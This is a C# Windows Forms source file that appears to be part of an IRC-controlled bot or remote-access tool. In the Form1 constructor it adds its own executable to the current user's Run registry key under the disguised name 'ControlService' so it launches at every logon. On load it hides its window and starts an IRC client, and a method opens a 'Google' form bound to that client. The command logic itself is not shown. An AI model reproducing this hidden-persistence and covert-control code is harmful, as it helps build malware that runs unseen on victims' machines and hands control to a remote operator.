using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using ChatSharp;
using Microsoft.Win32;

namespace tom
{
    public partial class Form1 : Form
    {
        IRC irc;

        public Form1()
        {
            InitializeComponent();
                  

            RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            rk.SetValue("ControlService", Application.ExecutablePath.ToString());

            
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            irc = new IRC(this);
            Hide();
        }

        public void test()
        {
            Google google = new Google(irc);
            google.Show();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            this.Hide();
        }
    }
}
